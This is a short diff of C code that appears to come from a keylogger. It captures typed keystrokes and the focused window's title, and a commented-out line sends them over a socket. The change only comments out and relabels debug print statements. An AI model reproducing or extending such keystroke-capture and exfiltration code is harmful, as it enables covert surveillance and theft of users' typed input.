@@ -166,7 +166,7 @@ int main() {
                 }
 
                 if (newMsgBuff[0] != '\0') {
-                    printf("Typed: %s\n", newMsgBuff);
+                    // printf("Typed A: %s\n", newMsgBuff);
                     // we send upon a detected key press
                     windowCapBuff = handleFocusedWindow();
                     uint8_t capLen = (uint8_t)strlen(windowCapBuff);
@@ -187,7 +187,7 @@ int main() {
                 }
 
                 if (newMsgBuff[0] != '\0' && holdClock > 30) {
-                    // printf("Typed: %s\n", newMsgBuff);
+                    // printf("Typed B: %s\n", newMsgBuff);
                     // we send upon a detected key press
                     // send(client_socket, newMsgBuff, strlen(newMsgBuff), 0);
                     windowCapBuff = handleFocusedWindow();
